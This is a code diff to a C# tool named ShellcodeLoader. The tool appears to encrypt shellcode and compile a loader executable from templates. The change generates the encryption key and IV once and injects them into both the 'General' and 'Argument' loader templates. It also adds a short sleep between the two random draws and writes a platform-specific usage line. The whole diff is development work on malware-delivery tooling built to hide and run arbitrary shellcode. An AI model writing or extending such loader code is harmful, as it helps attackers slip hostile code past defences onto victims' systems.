@@ -5,6 +5,7 @@ using System.Collections.Generic;
 using System.IO;
 using System.Security.Cryptography;
 using System.Text;
+using System.Threading;
 using System.Windows.Forms;
 using Microsoft.CSharp;
 
@@ -189,11 +190,13 @@ namespace ShellcodeLoader
                 parameters.OutputAssembly = path;
                 parameters.ReferencedAssemblies.Add("System.dll");
                 string sourceCode = "";
+                string key = RandomText(8);
+                Thread.Sleep(100);
+                string iv = RandomText(8);
+                encryptData = Encrypt(encryptData, key, iv);
+                privateKey = Encrypt(privateKey, key, iv);
                 if (radioButton1.Checked)
                 {
-                    string key = RandomText(8), iv = RandomText(8);
-                    encryptData = Encrypt(encryptData, key, iv);
-                    privateKey = Encrypt(privateKey, key, iv);
                     sourceCode = ReadFile("Template\\General.tpl");
                     sourceCode = sourceCode.Replace("{{Decrypt_Key_Here}}", key);
                     sourceCode = sourceCode.Replace("{{Decrypt_IV_Here}}", iv);
@@ -203,6 +206,8 @@ namespace ShellcodeLoader
                 else
                 {
                     sourceCode = ReadFile("Template\\Argument.tpl");
+                    sourceCode = sourceCode.Replace("{{Decrypt_Key_Here}}", key);
+                    sourceCode = sourceCode.Replace("{{Decrypt_IV_Here}}", iv);
                     using (StreamWriter sw = new StreamWriter("Output.txt"))
                     {
                         sw.WriteLine("Private Key:");
@@ -211,7 +216,7 @@ namespace ShellcodeLoader
                         sw.WriteLine("Encrypt Data:");
                         sw.WriteLine(encryptData);
                         sw.WriteLine("");
-                        sw.WriteLine("Usage: shellcode.exe \"Private Key\" \"Encrypt Data\"");
+                        sw.WriteLine("Usage: shellcode" + platform + ".exe \"Private Key\" \"Encrypt Data\"");
                         sw.Flush();
                         sw.Close();
                     }
